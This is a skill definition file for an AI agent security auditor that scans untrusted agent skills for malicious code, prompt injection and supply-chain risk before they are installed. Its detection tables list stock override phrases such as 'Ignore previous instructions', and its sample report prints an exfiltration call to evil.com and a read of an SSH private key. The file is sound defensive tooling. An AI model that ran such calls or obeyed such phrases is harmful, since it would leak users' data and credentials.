---
name: "skill-security-auditor"
description: "Security audit and vulnerability scanner for AI agent skills before installation. Use when evaluating a skill from an untrusted source, auditing a skill directory or git repo URL for malicious code, gating installs of Claude Code plugins / OpenClaw / Codex skills, scanning Python for dangerous patterns (os.system, eval, subprocess, network exfiltration), detecting prompt injection in SKILL.md files, or checking dependency supply-chain risk and file-system boundary violations. Triggers on 'audit this skill', 'is this skill safe'."
---

# Skill Security Auditor

## Token Economy

Apply `token-economy` whenever this skill would otherwise trigger broad exploration, repeated file reads, multi-file scans, or heavy reference loading.

- Load only the phase, reference, or script needed for the current step.
- Prefer targeted search and line-range reads over whole-file slurping.
- Batch independent tool calls and keep narration/results tight.
- If the task is tiny or the file set is already known, apply the relevant patterns inline instead of loading extra material.


Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL; T6 findings honor strict mode too)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json

# T6 (Agent Trust & Permission Patterns) — all 5 checks ON by default
# Skip the whole T6 category (legacy fast scan):
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --skip-t6

# Run a single T6 check in isolation (any --check-* overrides the default ON set):
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --check-lethal-trifecta
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --check-egress-scope
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --check-trust-boundary
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --check-scope-creep
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --check-hitl

# Exempt the auditor itself from T6 (its broad file reads trip the heuristics):
python3 scripts/skill_security_auditor.py skill-security-auditor/ --self-exempt
```

### T6 known false-positive patterns

T6 checks are conservative heuristics — most legitimate advisory skills score
0 T6 findings, but a few patterns will reliably trip them. Document any
recurring FP class here when you see it:

- **Docs skills that show API examples** (e.g. `coding-best-practices`) may
  trip `T6-LETHAL-TRIFECTA` when their reference markdown shows `fetch()`
  POSTs + `process.env.API_KEY` examples + tool-name strings in the same
  skill. The skill itself doesn't *do* anything — it's documentation. Inspect
  the flagged lines; if all three buckets resolve to code-fence examples in
  reference files, downgrade manually.
- **The auditor itself** matches every pattern it scans for (it's a scanner —
  its source contains all the dangerous-pattern regexes by design). Run with
  `--self-exempt` when auditing `skill-security-auditor/`.
- **Test fixture strings** containing payloads like `"rm -rf /\n"` for stress
  testing trip `T6-NO-HITL`. Inspect — if the string is genuinely a fixture
  (not an executable command), it's noise.

## Use as a pre-install gate

When importing skills from external repos into a canonical skills repo, run this
auditor as a gate *before* the import PR opens, and record the result as a new
row in the repo-root `NOTICE.md` file (or under the existing upstream's section
if one already exists):

```bash
python3 scripts/skill_security_auditor.py /path/to/imported-skill/
# In NOTICE.md, add a row to the appropriate license section listing:
#   local skill, upstream path, import date, and local modifications.
# Vetting outcome (e.g. "Passed skill-security-auditor scan, 0 findings")
# goes in the section's vetting summary paragraph.
```

If this tool is itself being imported as a new skill, ship it in its own PR
first. Downstream import PRs can then cite concrete scan results as vetting
evidence, rather than bundling the gate with the content it gates. Validated
across PR #23 (auditor bootstrap) → PR #24 (LLM-eng trio) → PR #25 (compliance
bundle) on 2026-04-17.

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL |
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL |
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL |
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL |

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.